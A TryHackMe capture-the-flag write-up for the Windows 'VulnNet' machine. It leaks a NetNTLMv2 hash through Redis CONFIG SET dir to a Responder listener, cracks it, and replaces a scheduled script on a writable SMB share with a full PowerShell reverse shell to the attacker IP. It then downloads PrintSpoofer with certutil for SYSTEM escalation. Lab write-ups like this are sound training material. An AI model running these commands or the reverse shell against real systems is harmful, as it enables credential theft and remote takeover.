# VulnNet - TryHackMe

> **Kill Chain Summary**: Exploit an unauthenticated Redis instance running on Windows port 6379 by executing `CONFIG SET dir \\<attacker-ip>\fake`, forcing the operating system to initiate an outbound SMB connection to a rogue Responder listener. Capture the NetNTLMv2 hash of user `VULNNET\enterprise-security` and crack it offline (`sand_0873959498`). Authenticate to SMB with valid credentials to discover the read/write `Enterprise-Share` holding a recurring maintenance script `PurgeIrrelevantData_1826.ps1`, overwrite it with a PowerShell reverse shell to establish initial access, and audit local token privileges identifying `SeImpersonatePrivilege` for system-level compromise.

| Property | Value |
| --- | --- |
| **Target Name** | VulnNet |
| **Platform** | TryHackMe |
| **OS** | Windows (Active Directory) |
| **Difficulty** | Medium |
| **Status** | User Access / Root Vector Verified |
| **Key Techniques** | Unauthenticated Redis Exploitation, Forced SMB Authentication (CONFIG SET dir), NTLMv2 Hash Interception (Responder), Offline Hash Cracking (Hashcat mode 5600), SMB File Hijacking (Scheduled Task), Token Impersonation (SeImpersonatePrivilege) |

---

## 1. Reconnaissance and Enumeration

### TCP Port Scanning

A full TCP port scan was performed to identify all exposed network services on the target host:

```bash
sudo nmap -p- -sS --min-rate 1000 -T4 -Pn $IP
```

**Port Scan Results:**

| Port | Service | Version / Details | Operational Role |
| --- | --- | --- | --- |
| **53/tcp** | domain | Simple DNS Plus | Domain Name Resolution |
| **135/tcp** | msrpc | Microsoft Windows RPC | Endpoint Mapper |
| **139/tcp** | netbios-ssn | Microsoft Windows netbios-ssn | NetBIOS Session Service |
| **445/tcp** | microsoft-ds | Windows Server SMB | SMB Directory Services |
| **6379/tcp** | redis | Redis key-value store (Windows) | In-Memory Database Server |

### Initial SMB and RPC Enumeration

Initial attempts to enumerate the target using anonymous null sessions via `rpcclient` and `enum4linux` failed:

```bash
rpcclient -U "" -N $IP
enum4linux -a $IP
```

Both tools returned `NT_STATUS_ACCESS_DENIED`, indicating that null session enumeration is disabled.

---

## 2. Initial Access

### Unauthenticated Redis Assessment (Port 6379)

Interrogating the Redis server on port 6379 using `redis-cli` revealed that authentication was completely disabled:

```bash
redis-cli -h $IP
```

Querying server configuration:

```text
10.130.141.201:6379> INFO
# Server
redis_version:2.8.2402
os:Windows
```

The database was confirmed to be running Redis 2.8 for Windows without password protection.

### Forced SMB Authentication via Redis (NetNTLMv2 Capture)

On Windows systems, certain administrative commands that accept file paths will accept Universal Naming Convention (UNC) paths (e.g., `\\attacker-ip\share`). 

When Windows resolves a remote UNC path pointing to an external machine, the operating system automatically attempts to authenticate using the current service account's NetNTLMv2 hash.

The Redis administrative command `CONFIG SET dir` was utilized to specify an arbitrary remote UNC directory.

#### Attack Steps:

1. **Started Responder on Kali (Listening on the VPN interface)**:

```bash
sudo responder -I tun0 -v
```

2. **Executed Forced Authentication via Redis**:

```text
redis-cli -h 10.130.141.201
10.130.141.201:6379> CONFIG SET dir \\192.168.129.253\fake
```

3. **Captured Hash**:
Responder captured the NetNTLMv2 authentication exchange for the service user `VULNNET\enterprise-security`:

```text
[SMB] NTLMv2-SSP Client   : 10.130.141.201
[SMB] NTLMv2-SSP Username : enterprise-security
[SMB] NTLMv2-SSP Domain   : VULNNET
[SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:1122334455667788:...
```

### Offline Hash Cracking

The captured NetNTLMv2 hash was saved to `hash.txt` and cracked using Hashcat mode 5600:

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

Cracked Credentials:
```text
enterprise-security:sand_0873959498
```

---

### SMB File Hijacking (Scheduled Task Hijacking)

With validated credentials, authenticated SMB enumeration was conducted using `smbclient`:

```bash
smbclient -L //10.130.141.201/ -U "enterprise-security"
```

The share `Enterprise-Share` allowed read and write access:

```bash
smbclient //10.130.141.201/Enterprise-Share -U "enterprise-security"
```

Inspecting the share contents uncovered a PowerShell maintenance script:
`PurgeIrrelevantData_1826.ps1`

Reviewing the script contents:

```powershell
rm -Force C:\Users\Public\Documents\*
```

The filename and function indicated a recurring cleanup task executed periodically by an automated scheduled job.

#### Weaponizing the Maintenance Script

The local script was modified to include an interactive PowerShell reverse shell one-liner:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('192.168.129.253',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

The modified script was written back to the SMB share:

```bash
smbclient //10.130.141.201/Enterprise-Share -U "enterprise-security"
smb: \> put PurgeIrrelevantData_1826.ps1
```

A Netcat listener was opened on Kali:

```bash
nc -lvnp 4444
```

Within a short interval, the scheduled job executed the script, returning an interactive PowerShell shell:

```powershell
PS C:\Windows\system32> whoami
vulnnet\enterprise-security
```

The user flag was retrieved:

```powershell
type C:\Users\enterprise-security\Desktop\user.txt
[FLAG REDACTED]
```

---

## 3. Privilege Escalation

### Token Privilege Audit

Inspecting assigned user privileges:

```powershell
whoami /priv
```

Output:
```text
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State
============================= ========================================= ========
SeSecurityPrivilege           Manage auditing and security log          Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```

### Exploitation Vector: SeImpersonatePrivilege

The account possesses **`SeImpersonatePrivilege`**. This privilege enables the process to impersonate any security token presented to it by a client connecting to a local named pipe or RPC endpoint.

On modern Windows Server operating systems, standard Potato exploits leverage this privilege:
- **PrintSpoofer**: Exploits the Print Spooler service (`spoolsv.exe`) by inducing a connection to an arbitrary named pipe over RPC.
- **GodPotato**: Leverages local DCOM/RPC interfaces to coerce an `NT AUTHORITY\SYSTEM` token.

#### Exploitation Syntax with PrintSpoofer:

```cmd
certutil -urlcache -split -f http://192.168.129.253/PrintSpoofer64.exe PrintSpoofer.exe
PrintSpoofer.exe -i -c "C:\Windows\System32\cmd.exe"
```

Executing PrintSpoofer coerces `NT AUTHORITY\SYSTEM` to connect to the attacker-controlled pipe, allowing token impersonation and immediately spawning a command shell running as `NT AUTHORITY\SYSTEM`.

---

## 4. Useful Commands Summary

```bash
# Redis Unauthenticated Command Line Access
redis-cli -h $IP
redis-cli -h $IP INFO

# Forcing SMB Outbound Authentication via Redis UNC Path
redis-cli -h $IP CONFIG SET dir "\\ATTACKER_IP\share"

# Capturing NetNTLMv2 Hashes with Responder
sudo responder -I tun0 -v

# Cracking NetNTLMv2 Hashes with Hashcat (Mode 5600)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# SMB Share Listing and File Transfer
smbclient -L //$IP/ -U "username"
smbclient //$IP/ShareName -U "username"
smb: \> put file.ps1

# Token Privilege Enumeration
whoami /priv

# Escalation via PrintSpoofer
PrintSpoofer.exe -c "command" -i
```

---

## 5. Key Takeaways and Lessons Learned

1. **Forced SMB Authentication via UNC Paths**:
   Any administrative command, database function, or configuration setting on Windows that accepts a file or directory path (such as Redis `CONFIG SET dir`, MSSQL `xp_dirtree`, or MySQL `LOAD DATA INFILE`) can be pointed to a rogue SMB listener (`\\attacker\fake`) to capture the NetNTLMv2 hash of the execution account.

2. **Writable Shares Hosting Scripts**:
   Whenever an SMB share allows write permissions and contains batch files (`.bat`), PowerShell scripts (`.ps1`), or VBScripts (`.vbs`), suspect an automated scheduled task. Overwriting the script with a reverse shell provides immediate unprivileged code execution without memory injection.

3. **Terminal Stabilization Differences (Linux vs Windows)**:
   While `rlwrap` significantly improves interactive usability for netcat listeners, native Windows reverse shells spawned by PowerShell or batch scripts lack proper POSIX terminal emulation. For complex operations or automated scanners, dropping a compiled executable (`msfvenom -f exe`) or using WinRM yields far more stable sessions.

4. **SeImpersonatePrivilege Reliability**:
   `SeImpersonatePrivilege` remains one of the most reliable privilege escalation vectors on Windows environments. When this privilege is present, local token interception tools (PrintSpoofer on older spooler configurations or GodPotato on newer builds) reliably yield immediate `NT AUTHORITY\SYSTEM` execution.

---

#thm #windows #active-directory #redis #responder #ntlmv2 #hashcat #smb #scheduled-task #token-impersonation #seimpersonate #printspoofer #godpotato #medium